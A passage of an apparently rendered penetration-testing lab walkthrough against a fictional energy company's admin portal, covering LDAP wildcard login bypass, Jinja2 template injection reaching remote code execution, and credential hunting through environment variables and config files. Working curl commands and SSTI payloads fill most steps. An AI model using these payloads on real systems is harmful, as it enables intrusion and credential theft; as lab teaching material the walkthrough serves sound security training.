+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;subnet&gt;.11  eng-db.meridian-energy.corp&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;subnet&gt;.12  ldap.meridian-energy.corp&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;subnet&gt;.13  db.meridian-energy.corp&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</code></pre></div>
+</div>
+<p>Verify connectivity to the admin portal:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Verify connectivity to the admin portal</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code}&quot;</span><span class="w"> </span>http://admin.meridian-energy.corp/
+</code></pre></div>
+</div>
+<p>A <code>200</code> response confirms the portal is reachable. Any other status code indicates a connectivity issue. Verify your VPN connection and /etc/hosts entries before proceeding.</p>
+<h4 id="step-3-explore-the-admin-portal-login-page">Step 3: Explore the Admin Portal Login Page</h4>
+<p>Examine the login page to understand the authentication mechanism:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Fetch the admin portal login page</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>http://admin.meridian-energy.corp/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-100
+</code></pre></div>
+</div>
+<p>Look for the login form fields, the form action URL, and any hidden fields or JavaScript that indicate the authentication method. The form should submit to a login endpoint via POST with <code>username</code> and <code>password</code> fields.</p>
+<p>Examine the page for visual clues about the authentication backend. Error messages, footer text, or form labels may reference "LDAP," "Directory," or "Active Directory." These hints confirm that the authentication is LDAP-based rather than database-based.</p>
+<h4 id="step-4-attempt-authentication-with-a-known-username">Step 4: Attempt Authentication with a Known Username</h4>
+<p>Try logging in with Sarah Chen's username and an incorrect password to observe the error behavior:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test login with incorrect password</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=s.chen&amp;password=WrongPassword123&quot;</span><span class="w"> </span>-v<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-30
+</code></pre></div>
+</div>
+<p>The <code>-v</code> flag shows the full HTTP request and response headers. Examine the response carefully for:</p>
+<ul>
+<li><strong>Error messages</strong>: "Invalid credentials," "Authentication failed," or "LDAP bind error" confirm the authentication backend</li>
+<li><strong>Response codes</strong>: A <code>401</code> or <code>403</code> indicates failed authentication; a <code>302</code> redirect indicates successful authentication</li>
+<li><strong>Set-Cookie headers</strong>: A session cookie in the response headers means the server uses cookie-based sessions</li>
+<li><strong>Response body</strong>: HTML content may reveal error details, stack traces, or LDAP-specific messages</li>
+</ul>
+<p>Record the exact error message. LDAP-specific error messages (such as "LDAP authentication failed" or "Invalid DN syntax") confirm that the portal authenticates against an LDAP server and inform your injection strategy.</p>
+<h4 id="step-5-attempt-authentication-with-a-nonexistent-username">Step 5: Attempt Authentication with a Nonexistent Username</h4>
+<p>Try a username that does not exist in the LDAP directory:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test login with nonexistent username</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=nonexistent.user&amp;password=Test123&quot;</span><span class="w"> </span>-v<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-30
+</code></pre></div>
+</div>
+<p>Compare the error message to the one from Step 4. If the messages differ (e.g., "User not found" vs. "Invalid password"), the application reveals whether the username exists. Username enumeration through differing error messages is a separate vulnerability, but it confirms that <code>s.chen</code> is a valid account.</p>
+<h4 id="step-6-exploit-ldap-wildcard-injection">Step 6: Exploit LDAP Wildcard Injection</h4>
+<p>The LDAP search filter constructed by the application looks like:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>(&amp;(uid=s.chen)(userPassword=USER_INPUT))
+</code></pre></div>
+<p>If the application does not escape the <code>*</code> character, submitting <code>*</code> as the password produces:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>(&amp;(uid=s.chen)(userPassword=*))
+</code></pre></div>
+<p>The <code>*</code> wildcard matches any value in the <code>userPassword</code> field. Since every LDAP entry has a password value, the filter matches Sarah Chen's entry regardless of the actual password.</p>
+<p>Submit the injection:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Exploit LDAP injection with wildcard password</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-c<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/login<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=s.chen&amp;password=*&quot;</span><span class="w"> </span>-v<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-40
+</code></pre></div>
+</div>
+<p>Examine the response. A successful bypass shows:</p>
+<ul>
+<li>A <code>302</code> redirect to the dashboard or admin page</li>
+<li>A <code>Set-Cookie</code> header containing a session token</li>
+<li>No error message in the response body</li>
+</ul>
+<p>If you see a redirect, the LDAP injection worked. The session cookie is saved in <code>admin_cookies.txt</code> for use in subsequent requests.</p>
+<h4 id="step-7-verify-authenticated-access">Step 7: Verify Authenticated Access</h4>
+<p>Follow the redirect and access the admin dashboard:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Access the admin dashboard with session cookie</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>http://admin.meridian-energy.corp/dashboard
+</code></pre></div>
+</div>
+<p>The dashboard should display administrative functionality:</p>
+<ul>
+<li><strong>User Management</strong>: List, create, and modify user accounts</li>
+<li><strong>System Configuration</strong>: Network settings, service status, backup schedules</li>
+<li><strong>Report Generator</strong>: Create compliance, audit, and engineering reports</li>
+<li><strong>Logs</strong>: Authentication logs, system events, error logs</li>
+</ul>
+<p>Record all available sections and their URLs. The Report Generator is the target for Phase 2.</p>
+<h4 id="step-8-enumerate-the-admin-dashboard">Step 8: Enumerate the Admin Dashboard</h4>
+<p>Explore each section of the dashboard to understand the full attack surface:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check user management section</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>http://admin.meridian-energy.corp/users
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check system configuration section</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>http://admin.meridian-energy.corp/config
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check the report generator</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>http://admin.meridian-energy.corp/reports
+</code></pre></div>
+</div>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check application logs</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>http://admin.meridian-energy.corp/logs
+</code></pre></div>
+</div>
+<p>Document what each section reveals. The user management section may list all LDAP accounts and their organizational units. The configuration section may expose internal hostnames and service endpoints. The logs section may show recent authentication attempts, including your failed login from Step 4.</p>
+<p>The Report Generator is the priority target. Examine its form fields, submit behavior, and any template or format options it provides.</p>
+<hr />
+<h3 id="phase-2-server-side-template-injection-ssti">Phase 2: Server-Side Template Injection (SSTI)</h3>
+<p>The Report Generator allows administrators to create reports by entering parameters into a form. The application takes the form input and renders it using Jinja2 templates. If user input is embedded directly into the template string before rendering, the application is vulnerable to SSTI.</p>
+<h4 id="step-9-understand-the-report-generator-interface">Step 9: Understand the Report Generator Interface</h4>
+<p>Examine the Report Generator form:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Fetch the report generator form</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>http://admin.meridian-energy.corp/reports
+</code></pre></div>
+</div>
+<p>Look at the form fields. The generator likely accepts parameters like:</p>
+<ul>
+<li><strong>Report title</strong>: A free-text field for naming the report</li>
+<li><strong>Report type</strong>: A dropdown for selecting the report category</li>
+<li><strong>Date range</strong>: Start and end dates for the report period</li>
+<li><strong>Additional notes or description</strong>: A free-text field for custom content</li>
+</ul>
+<p>The free-text fields (title, notes, description) are the most likely injection points. The application probably concatenates these values into a Jinja2 template string before rendering.</p>
+<h4 id="step-10-submit-a-normal-report">Step 10: Submit a Normal Report</h4>
+<p>Generate a legitimate report to see the output format:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Generate a normal report</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title=Quarterly+Compliance+Report&amp;type=compliance&amp;notes=Standard+quarterly+review&quot;</span>
+</code></pre></div>
+</div>
+<p>Examine the response. The rendered report should include the title and notes you submitted, formatted within a report template. Note where your input appears in the output. If the title "Quarterly Compliance Report" appears verbatim in the rendered HTML, that field is a candidate for SSTI testing.</p>
+<h4 id="step-11-test-for-ssti-with-a-mathematical-expression">Step 11: Test for SSTI with a Mathematical Expression</h4>
+<p>Inject a Jinja2 expression into the title or notes field:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test SSTI with mathematical expression in the title field</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{7*7}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>Examine the response. If the output shows <code>49</code> where you submitted <code>{{7*7}}</code>, SSTI is confirmed. The application compiled your input as Jinja2 template code and evaluated the expression.</p>
+<p>If the title field is not vulnerable, try the notes field:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test SSTI in the notes field</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title=Test+Report&amp;type=compliance&amp;notes={{7*7}}&quot;</span>
+</code></pre></div>
+</div>
+<p>Again, look for <code>49</code> in the output. Whichever field renders the expression is the injection point for all subsequent payloads.</p>
+<h4 id="step-12-confirm-ssti-with-string-operations">Step 12: Confirm SSTI with String Operations</h4>
+<p>Verify SSTI with a more definitive payload that could not result from coincidence:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Confirm SSTI with string multiplication</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{7*&#39;7&#39;}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>In Python (and Jinja2), <code>7*'7'</code> produces the string <code>7777777</code> (the character <code>7</code> repeated seven times). If the output shows <code>7777777</code>, the template engine is evaluating Python expressions, confirming full SSTI.</p>
+<h4 id="step-13-enumerate-available-objects">Step 13: Enumerate Available Objects</h4>
+<p>Before jumping to RCE, explore what objects and data are accessible through the template context:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - List template configuration items</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{config.items()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>config</code> object contains the Flask application configuration. Look for:</p>
+<ul>
+<li><code>SECRET_KEY</code>: The application's secret key used for signing sessions</li>
+<li><code>SQLALCHEMY_DATABASE_URI</code>: Database connection string (if using SQLAlchemy)</li>
+<li><code>LDAP_HOST</code>: The LDAP server hostname</li>
+<li>Any custom configuration keys that reference database credentials or service endpoints</li>
+</ul>
+<p>Record every configuration item. Database connection strings and service hostnames are valuable for Phase 3.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Read request environment variables</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{request.environ}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>request.environ</code> dictionary contains WSGI environment variables, HTTP headers, and server information. Examine the output for internal hostnames, port numbers, and any credentials passed through environment variables.</p>
+<h4 id="step-14-test-command-execution">Step 14: Test Command Execution</h4>
+<p>Attempt to execute a system command through the Jinja2 sandbox escape:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test command execution via SSTI</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;id&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>If the output shows <code>uid=</code> followed by user and group IDs (e.g., <code>uid=0(root) gid=0(root)</code>), you have achieved remote code execution through SSTI. The <code>cycler</code> object is a Jinja2 global, and its <code>__init__.__globals__</code> dictionary provides access to the <code>os</code> module.</p>
+<p>Note the UID in the output. If the application runs as root (<code>uid=0</code>), every subsequent command executes with root privileges. If it runs as a non-root user (e.g., <code>uid=1000(app)</code>), commands execute with that user's permissions.</p>
+<h4 id="step-15-explore-the-server-filesystem">Step 15: Explore the Server Filesystem</h4>
+<p>Use RCE to explore the admin portal server:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - List the application directory</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;ls -la /app/&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>Look for configuration files, <code>.env</code> files, database connection modules, and deployment scripts. Common locations include:</p>
+<ul>
+<li><code>/app/config.py</code> or <code>/app/settings.py</code>: Application configuration</li>
+<li><code>/app/.env</code>: Environment-specific settings</li>
+<li><code>/app/requirements.txt</code>: Python dependencies (reveals framework and library versions)</li>
+<li><code>/app/app.py</code> or <code>/app/main.py</code>: Application entry point</li>
+</ul>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Read the application source code</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;cat /app/app.py&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The application source code reveals the exact LDAP filter construction (confirming the injection vector), the Jinja2 rendering logic (confirming the SSTI vector), and potentially hardcoded credentials or environment variable names for the engineering database.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check for .env files</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;cat /app/.env 2&gt;/dev/null; echo ---; env&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The command tries to read <code>/app/.env</code> first, then falls back to printing all environment variables with <code>env</code>. Either source may contain database credentials.</p>
+<hr />
+<h3 id="phase-3-credential-discovery">Phase 3: Credential Discovery</h3>
+<p>With code execution on the admin portal server, you can read environment variables, configuration files, and any data accessible to the application process. The engineering database credentials are stored somewhere on the server. Your task is to find them.</p>
+<h4 id="step-16-read-all-environment-variables">Step 16: Read All Environment Variables</h4>
+<p>Use SSTI to dump the complete process environment:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Dump all environment variables via SSTI</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;env&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The output should contain multiple environment variables. Scan for:</p>
+<ul>
+<li><strong>ENG_DB_HOST</strong>: The hostname or IP of the engineering database</li>
+<li><strong>ENG_DB_USER</strong>: The database username</li>
+<li><strong>ENG_DB_PASS</strong>: The database password</li>
+<li><strong>ENG_DB_NAME</strong>: The database name</li>
+<li><strong>DATABASE_URL</strong>: A connection string that may contain all of the above</li>
+<li>Any variable with <code>DB</code>, <code>POSTGRES</code>, <code>SQL</code>, <code>PASS</code>, <code>SECRET</code>, or <code>CRED</code> in its name</li>
+</ul>
+<p>Record every credential-related variable. The engineering database password should be something like <code>Eng_DB_Pr0d_2024#</code>.</p>
+<h4 id="step-17-access-environment-variables-through-python-objects">Step 17: Access Environment Variables Through Python Objects</h4>
+<p>An alternative approach uses Jinja2's access to the <code>os.environ</code> dictionary:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Read environment variables via os.environ</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.environ}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The output is a Python dictionary-style string containing all environment variables. While less readable than the <code>env</code> command output, it confirms the same data and may reveal additional variables set through Python code rather than the OS environment.</p>
+<h4 id="step-18-read-configuration-files">Step 18: Read Configuration Files</h4>
+<p>Check for database configuration in application files:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Read database configuration file</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;find /app -name \&quot;*.py\&quot; -exec grep -l -i \&quot;database\\|postgres\\|eng_db\&quot; {} +&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>The <code>find</code> command searches for Python files containing database-related strings. Read any files it discovers:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Read identified configuration files</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;cat /app/config.py&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>Configuration files may contain hardcoded fallback credentials used when environment variables are not set. They also reveal the expected database schema, table names, and query patterns, all of which inform Phase 4.</p>
+<h4 id="step-19-verify-database-connectivity">Step 19: Verify Database Connectivity</h4>
+<p>Before attempting to query the engineering database, verify that the admin portal server can reach it:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Test network connectivity to engineering database</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;ping -c 1 eng-db.meridian-energy.corp 2&gt;&amp;1 || echo Host unreachable&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>If the internal hostname does not resolve, try the Docker service name or direct IP:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Try alternative hostname for engineering database</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;getent hosts eng-db.meridian-energy.corp engineering-db eng-db 2&gt;&amp;1&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>Record the hostname that resolves successfully. You will use it in the PostgreSQL connection command in Phase 4.</p>
+<h4 id="step-20-check-for-psql-client">Step 20: Check for psql Client</h4>
+<p>Verify that the PostgreSQL client is available on the admin portal server:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check for psql client</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-b<span class="w"> </span>admin_cookies.txt<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://admin.meridian-energy.corp/reports/generate<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;title={{cycler.__init__.__globals__.os.popen(&#39;which psql 2&gt;&amp;1; psql --version 2&gt;&amp;1&#39;).read()}}&amp;type=compliance&amp;notes=test&quot;</span>
+</code></pre></div>
+</div>
+<p>If <code>psql</code> is not installed, check for alternative database clients:</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Check for alternative database tools</p>
